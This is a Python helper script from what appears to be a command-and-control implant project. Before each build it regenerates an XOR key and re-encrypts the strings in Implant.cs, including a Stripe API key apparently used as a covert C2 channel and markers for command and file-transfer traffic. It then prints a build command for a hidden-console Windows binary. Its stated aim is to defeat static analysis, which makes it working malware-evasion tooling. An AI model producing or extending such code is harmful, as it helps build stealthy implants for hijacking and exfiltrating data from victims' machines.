#!/usr/bin/env python3
"""
Regenerates the XOR encryption key in Implant.cs

Run this before each build to ensure the key changes, making 
string extraction harder for static analysis.
"""

import random
import re

def generate_key(length=16):
    """Generate a random XOR key"""
    return bytes(random.randint(0, 255) for _ in range(length))

def encrypt_string(plaintext, key):
    """XOR encrypt a string"""
    encrypted = bytes(ord(plaintext[i]) ^ key[i % len(key)] for i in range(len(plaintext)))
    return ", ".join(f"0x{b:02X}" for b in encrypted)

def main():
    # ============================================================
    # *** IMPORTANT: CHANGE THIS TO YOUR STRIPE TEST API KEY ***
    # Get your key from: https://dashboard.stripe.com/test/apikeys
    # This should be a TEST mode key: sk_test_...
    # NEVER use a live mode key (sk_live_...) for C2 operations!
    # ============================================================
    YOUR_STRIPE_API_KEY = "sk_test_YOUR_STRIPE_TEST_KEY_HERE"
    
    # Generate new key
    key = generate_key(16)
    key_hex = ", ".join(f"0x{b:02X}" for b in key)
    
    print(f"[*] Generated new XOR key: {key_hex}")
    
    # Read Implant.cs (in ../implant/ folder)
    implant_path = '../implant/Implant.cs'
    with open(implant_path, 'r') as f:
        content = f.read()
    
    # Replace the key
    old_key_pattern = r'private static readonly byte\[\] Key = new byte\[\]\s*\{[^}]+\};'
    new_key = f'private static readonly byte[] Key = new byte[] \n    {{ \n        {key_hex}\n    }};'
    
    content = re.sub(old_key_pattern, new_key, content)
    
    # List of strings to re-encrypt with new key
    strings_to_encrypt = {
        'API_KEY': YOUR_STRIPE_API_KEY,
        'HEARTBEAT': 'heartbeat',
        'C2_PENDING': 'c2-pending',
        'C2_PROCESSING': 'c2-processing',
        'C2_DONE': 'c2-done',
        'XFER_UPLOAD_CTRL': 'xfer-upload-ctrl',
        'XFER_UPLOAD_PROCESSING': 'xfer-upload-processing',
        'XFER_UPLOAD_IDX': 'xfer-upload-idx',
        'XFER_UPLOAD_DATA': 'xfer-upload-data',
        'XFER_DOWNLOAD_REQ': 'xfer-download-req',
        'XFER_DOWNLOAD_PROCESSING': 'xfer-download-processing',
        'XFER_DOWNLOAD_DONE': 'xfer-download-done',
        'XFER_DOWNLOAD_ERROR': 'xfer-download-error',
        'XFER_DOWNLOAD_DATA': 'xfer-download-data',
        'PENDING_CMD': 'pending_cmd',
        'IMPLANT': 'implant',
        'TAG': 'tag',
        'TYPE': 'type',
    }
    
    # Re-encrypt each string with new key
    for name, plaintext in strings_to_encrypt.items():
        encrypted_hex = encrypt_string(plaintext, key)
        # Match the exact pattern including potential multi-line formatting
        pattern = rf'static readonly byte\[\] ENC_{name} = new byte\[\][^;]+;'
        replacement = f'static readonly byte[] ENC_{name} = new byte[] {{ {encrypted_hex} }};'
        content = re.sub(pattern, replacement, content, flags=re.DOTALL)
    
    # Write back
    with open(implant_path, 'w') as f:
        f.write(content)
    
    print(f"[+] Regenerated encryption for {len(strings_to_encrypt)} strings")
    print(f"[+] {implant_path} updated successfully")
    print("\nNow rebuild with:")
    print("  cd ../implant")
    print("  dotnet publish Implant.csproj -c Release -r win-x64 -p:DefineConstants=HIDE_CONSOLE")

if __name__ == '__main__':
    main()
